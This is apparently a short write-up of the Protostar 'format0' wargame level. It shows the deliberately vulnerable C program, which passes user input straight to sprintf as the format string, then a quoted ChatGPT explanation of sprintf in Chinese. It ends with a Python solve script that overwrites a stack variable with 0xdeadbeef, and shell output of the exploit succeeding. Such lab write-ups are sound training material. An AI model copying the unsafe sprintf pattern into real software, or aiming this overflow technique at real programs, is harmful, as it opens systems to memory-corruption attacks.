source code
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Ask ChatGPT what `sprintf` does:

`sprintf()` 是一个 C 语言中的字符串格式化函数，用于将格式化的数据写入字符串缓冲区中。它的原型如下：

```C
int sprintf(char *str, const char *format, ...);
```

e.g.

```C
#include <stdio.h>

int main() {
    char buffer[100];
    int number = 42;
    float floatNumber = 3.14;

    sprintf(buffer, "The number is %d and the float number is %.2f", number, floatNumber);

    printf("%s\n", buffer);

    return 0;
}

```

So basicly the same vulnerability as `strcpy`.

`solve.py`
```python
from __future__ import print_function
from struct import pack

offset = 64
target = pack('<I', 0xdeadbeef)
payload = b'A' * offset
payload += target

print(payload, end='')
```

Let's see,
```shell
user@protostar:~$ ./format0 $(python solve.py)
you have hit the target correctly :)
```

